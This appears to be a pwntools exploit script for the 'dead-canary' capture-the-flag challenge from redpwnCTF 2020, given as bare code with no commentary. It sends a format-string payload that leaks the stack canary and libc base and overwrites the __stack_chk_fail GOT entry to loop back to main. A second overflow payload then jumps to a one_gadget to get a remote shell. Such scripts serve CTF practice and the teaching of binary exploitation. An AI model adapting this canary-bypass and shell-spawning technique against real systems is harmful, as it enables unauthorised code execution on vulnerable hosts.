#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./dead-canary"
LIBCNAME = "../the-library/libc.so.6"

hosts = ("2020.redpwnc.tf","localhost","localhost")
ports = (31744,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  pass

## exploit ###########################################

def exploit():
  global c
  stack_size = 0x110
  main_addr = 0x400737 
  ini_array = 0x600e10
  fini_array = 0x600e18+8
  pop_rdi = 0x4008e3
  ogs = [0x4f2c5,0x4f322,0x10a38c]

  c.recvuntil("What is your name: ")
  pay = "%39$llx\n" # canary
  pay += "%41$llx\n" # libc_start_main+243
  pay += "%{}cA".format(str(0x40 - 8 -1 -9 - 8 -5)) # $8
  pay += "%13$hn"
  pay += "%{}c".format(str(0x737-0x40-1-8 + 9 - 8 +3 +5))
  pay += "%12$hn" + p8(0)
  pay += p64(main_addr) # $11
  pay += p64(binf.got["__stack_chk_fail"]) # $12
  pay += p64(binf.got["__stack_chk_fail"]+2) # $13
  pay += "A" * (stack_size - 8 - len(pay) + 1)
  c.send(pay)
  
  c.recvuntil("Hello ")
  canary = int(c.recvline().rstrip(),16) // 0x100 * 0x100
  print("[+] canary: "+hex(canary))
  libcbase = int(c.recvline().rstrip(),16) - libc.symbols["__libc_start_main"] -0xe7
  print("[+] libcbase: "+hex(libcbase))

  # again, main
  c.recvuntil("What is your name: ")
  pay = "A"*(stack_size-8)
  pay += p64(canary)
  pay += p64(0)
  pay += p64(libcbase + ogs[0])
  c.send(pay)

## main ##############################################

if __name__ == "__main__":
    global c

    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
